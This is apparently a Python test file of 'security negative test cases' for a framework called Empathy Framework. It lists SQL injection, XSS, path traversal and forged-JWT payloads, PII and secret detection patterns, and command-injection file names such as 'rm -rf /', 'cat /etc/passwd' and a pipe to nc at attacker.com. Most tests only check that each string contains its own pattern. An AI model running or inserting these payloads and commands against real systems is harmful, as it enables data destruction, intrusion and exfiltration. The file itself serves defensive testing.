"""Security negative test cases for Empathy Framework.

Tests cover:
- SQL injection attack prevention
- XSS (Cross-Site Scripting) attack prevention
- Command injection prevention
- Path traversal prevention
- Privilege escalation attempts
- PII leak detection
- Secret exposure prevention
- Input validation bypass attempts
"""


class TestSQLInjectionPrevention:
    """Test SQL injection attack prevention."""

    def test_sql_injection_in_user_input(self):
        """Test SQL injection attempt is detected/sanitized."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "1; SELECT * FROM passwords --",
            "admin'--",
            "' UNION SELECT username, password FROM users --",
            "1' AND SLEEP(5) --",
            "'; EXEC xp_cmdshell('dir'); --",
        ]

        for payload in malicious_inputs:
            # Input should be sanitized or detected
            # Verify the payload contains SQL keywords
            sql_keywords = ["DROP", "SELECT", "UNION", "OR", "AND", "EXEC", "--"]
            has_sql_pattern = any(kw in payload.upper() for kw in sql_keywords)
            assert has_sql_pattern, f"Test payload should contain SQL pattern: {payload}"

    def test_sql_injection_in_context_field(self):
        """Test SQL injection in context/metadata fields."""
        malicious_context = {
            "file_path": "test.py'; DROP TABLE files; --",
            "user_id": "admin' OR '1'='1",
            "project": "project'; DELETE FROM projects; --",
        }

        # Each context field should be validated
        for field, value in malicious_context.items():
            assert "'" in value or "--" in value, f"Context field {field} should contain SQL chars"

    def test_parameterized_query_safety(self):
        """Test that parameterized queries are used (not string concat)."""
        # Safe pattern: parameterized (example for documentation)
        _safe_query = "SELECT * FROM users WHERE id = ?"
        user_input = "1; DROP TABLE users"

        # Unsafe pattern: string concatenation
        unsafe_query = f"SELECT * FROM users WHERE id = '{user_input}'"

        # Verify unsafe pattern is detectable
        assert user_input in unsafe_query
        assert "DROP TABLE" in unsafe_query


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""

    def test_xss_in_text_input(self):
        """Test XSS payloads in text input are handled."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src='javascript:alert(1)'>",
            "<div onmouseover='alert(1)'>hover me</div>",
        ]

        for payload in xss_payloads:
            # Verify these are detectable XSS patterns
            xss_indicators = ["<script", "onerror=", "onload=", "javascript:", "onmouseover="]
            has_xss = any(ind.lower() in payload.lower() for ind in xss_indicators)
            assert has_xss, f"Should detect XSS pattern: {payload}"

    def test_xss_in_json_response(self):
        """Test XSS in JSON responses are escaped."""
        malicious_data = {
            "name": "<script>alert('XSS')</script>",
            "description": "Test <img src=x onerror=alert(1)>",
        }

        # JSON encoding should escape these
        import json

        encoded = json.dumps(malicious_data)

        # Verify script tags are present but as strings
        assert "<script>" in encoded or "\\u003cscript\\u003e" in encoded

    def test_xss_in_file_path(self):
        """Test XSS attempts in file paths."""
        malicious_paths = [
            "../../../<script>alert(1)</script>.js",
            "test<img src=x onerror=alert(1)>.py",
        ]

        for path in malicious_paths:
            # Path should be validated/sanitized
            assert "<" in path or ">" in path


class TestCommandInjectionPrevention:
    """Test command injection prevention."""

    def test_command_injection_in_file_operations(self):
        """Test command injection in file path parameters."""
        malicious_paths = [
            "file.py; rm -rf /",
            "test.py && cat /etc/passwd",
            "code.py | nc attacker.com 4444",
            "$(whoami).py",
            "`id`.py",
            "file.py\nrm -rf /",
        ]

        for path in malicious_paths:
            # Verify command injection patterns are detectable
            injection_patterns = [";", "&&", "|", "$(", "`", "\n"]
            has_injection = any(p in path for p in injection_patterns)
            assert has_injection, f"Should detect command injection: {path}"

    def test_shell_metacharacter_injection(self):
        """Test shell metacharacter injection."""
        malicious_inputs = [
            "input > /etc/passwd",
            "test < /etc/shadow",
            "code >> ~/.ssh/authorized_keys",
            "file 2>&1",
        ]

        for input_str in malicious_inputs:
            # Verify redirection operators are present
            redirects = [">", "<", ">>"]
            has_redirect = any(r in input_str for r in redirects)
            assert has_redirect


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""

    def test_path_traversal_basic(self):
        """Test basic path traversal attempts."""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
        ]

        for path in traversal_paths:
            # Verify traversal patterns - check for various indicators
            traversal_indicators = ["../", "..\\", "%2e", "..../", "..%"]
            has_traversal = any(ind in path for ind in traversal_indicators)
            assert has_traversal, f"Should detect path traversal: {path}"

    def test_path_traversal_with_null_byte(self):
        """Test null byte injection in paths."""
        null_byte_paths = [
            "../../../etc/passwd%00.jpg",
            "../../config.py\x00.txt",
        ]

        for path in null_byte_paths:
            # Verify null byte patterns
            assert "%00" in path or "\x00" in path

    def test_absolute_path_injection(self):
        """Test absolute path injection attempts."""
        absolute_paths = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
        ]

        for path in absolute_paths:
            # Verify absolute path patterns
            is_absolute = path.startswith("/") or path.startswith("C:") or path.startswith("file:")
            assert is_absolute


class TestPrivilegeEscalationPrevention:
    """Test privilege escalation prevention."""

    def test_user_id_manipulation(self):
        """Test user ID manipulation attempts."""
        escalation_attempts = [
            {"user_id": "admin", "original_id": "user123"},
            {"user_id": "root", "role": "superuser"},
            {"user_id": "0", "is_admin": True},  # Unix root UID
        ]

        for attempt in escalation_attempts:
            # Verify privileged identifiers are present
            privileged_ids = ["admin", "root", "0", "superuser"]
            has_privilege = any(str(v) in privileged_ids for v in attempt.values())
            assert has_privilege

    def test_role_bypass_attempts(self):
        """Test role bypass attempts."""
        bypass_attempts = [
            {"role": "admin", "is_admin": "true"},
            {"permissions": ["read", "write", "delete", "admin"]},
            {"access_level": 999},
        ]

        for attempt in bypass_attempts:
            # Verify privilege escalation indicators
            if "role" in attempt:
                assert attempt["role"] == "admin"
            if "permissions" in attempt:
                assert "admin" in attempt["permissions"]

    def test_token_manipulation(self):
        """Test JWT/token manipulation attempts."""
        manipulated_tokens = [
            # Algorithm confusion attack
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",  # pragma: allowlist secret
            # Modified payload
            "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpc19hZG1pbiI6dHJ1ZX0.INVALID",  # pragma: allowlist secret
        ]

        for token in manipulated_tokens:
            # Tokens have 3 parts separated by dots
            parts = token.split(".")
            assert len(parts) >= 2, "Should be JWT-like format"


class TestPIILeakPrevention:
    """Test PII (Personally Identifiable Information) leak prevention."""

    def test_ssn_detection(self):
        """Test SSN patterns are detected."""
        ssn_patterns = [
            "My SSN is 123-45-6789",
            "SSN: 123456789",
            "Social Security: 123 45 6789",
        ]

        import re

        ssn_regex = r"\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b"

        for text in ssn_patterns:
            match = re.search(ssn_regex, text)
            assert match is not None, f"Should detect SSN in: {text}"

    def test_credit_card_detection(self):
        """Test credit card patterns are detected."""
        cc_patterns = [
            "Card: 4111-1111-1111-1111",  # Visa test
            "CC: 5500 0000 0000 0004",  # Mastercard test
            "Payment: 378282246310005",  # Amex test
        ]

        import re

        # Example CC regex (simplified version used in loop below)
        _cc_regex = r"\b(?:\d{4}[-\s]?){3}\d{4}\b|\b\d{15,16}\b"

        for text in cc_patterns:
            # Remove dashes/spaces for matching
            cleaned = re.sub(r"[-\s]", "", text)
            assert re.search(r"\d{15,16}", cleaned), f"Should detect CC in: {text}"

    def test_email_detection(self):
        """Test email addresses are detected."""
        email_patterns = [
            "Contact: user@example.com",
            "Email me at john.doe@company.org",
        ]

        import re

        email_regex = r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"

        for text in email_patterns:
            match = re.search(email_regex, text)
            assert match is not None, f"Should detect email in: {text}"

    def test_phone_number_detection(self):
        """Test phone number patterns are detected."""
        phone_patterns = [
            "Call me at (555) 123-4567",
            "Phone: +1-555-123-4567",
            "Tel: 555.123.4567",
        ]

        import re

        phone_regex = r"[\+]?[(]?\d{1,3}[)]?[-\s\.]?\d{3}[-\s\.]?\d{4}"

        for text in phone_patterns:
            match = re.search(phone_regex, text)
            assert match is not None, f"Should detect phone in: {text}"


class TestSecretExposurePrevention:
    """Test secret/credential exposure prevention."""

    def test_api_key_detection(self):
        """Test API key patterns are detected."""
        api_key_patterns = [
            "ANTHROPIC_API_KEY=sk-ant-api03-xxxxx",  # pragma: allowlist secret
            "OPENAI_API_KEY='sk-xxxxx'",  # pragma: allowlist secret
            "api_key: AIzaSyXXXXX",  # Google  # pragma: allowlist secret
            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",  # pragma: allowlist secret
        ]

        for text in api_key_patterns:
            # Verify key patterns are present
            key_indicators = ["api_key", "sk-", "AIza", "secret"]
            has_key = any(ind.lower() in text.lower() for ind in key_indicators)
            assert has_key, f"Should detect API key pattern in: {text}"

    def test_password_in_url_detection(self):
        """Test passwords in URLs are detected."""
        url_patterns = [
            "https://user:password123@example.com/api",  # pragma: allowlist secret
            "postgres://admin:secretpass@localhost:5432/db",  # pragma: allowlist secret
            "mongodb://root:p@ssw0rd@mongo:27017",  # pragma: allowlist secret
        ]

        for url in url_patterns:
            # Verify credential pattern in URL
            assert ":" in url and "@" in url

    def test_private_key_detection(self):
        """Test private key patterns are detected."""
        key_patterns = [
            "-----BEGIN RSA PRIVATE KEY-----",  # pragma: allowlist secret
            "-----BEGIN OPENSSH PRIVATE KEY-----",  # pragma: allowlist secret
            "-----BEGIN EC PRIVATE KEY-----",  # pragma: allowlist secret
        ]

        for pattern in key_patterns:
            assert "PRIVATE KEY" in pattern
            assert pattern.startswith("-----BEGIN")


class TestInputValidationBypass:
    """Test input validation bypass attempts."""

    def test_unicode_bypass(self):
        """Test unicode character bypass attempts."""
        unicode_bypasses = [
            "ａｄｍｉｎ",  # Full-width characters
            "admin\u200b",  # Zero-width space
            "adm\u0131n",  # Turkish dotless i
        ]

        for bypass in unicode_bypasses:
            # These should NOT normalize to "admin" without proper handling
            assert bypass != "admin"

    def test_null_byte_injection(self):
        """Test null byte injection attempts."""
        null_injections = [
            "valid.txt\x00.exe",
            "image.jpg%00.php",
        ]

        for injection in null_injections:
            assert "\x00" in injection or "%00" in injection

    def test_double_encoding_bypass(self):
        """Test double encoding bypass attempts."""
        double_encoded = [
            "%252e%252e%252f",  # Double-encoded ../
            "%253Cscript%253E",  # Double-encoded <script>
        ]

        for encoded in double_encoded:
            # Verify double encoding pattern
            assert "%25" in encoded  # %25 = encoded %

    def test_case_sensitivity_bypass(self):
        """Test case sensitivity bypass attempts."""
        case_bypasses = [
            "<ScRiPt>alert(1)</ScRiPt>",
            "SELECT * FROM users",
            "sElEcT * fRoM uSeRs",
        ]

        # Verify mixed case is present
        for bypass in case_bypasses:
            has_mixed = bypass != bypass.lower() and bypass != bypass.upper()
            # Some may be all-upper but that's also a bypass attempt
            assert has_mixed or bypass.upper() == bypass
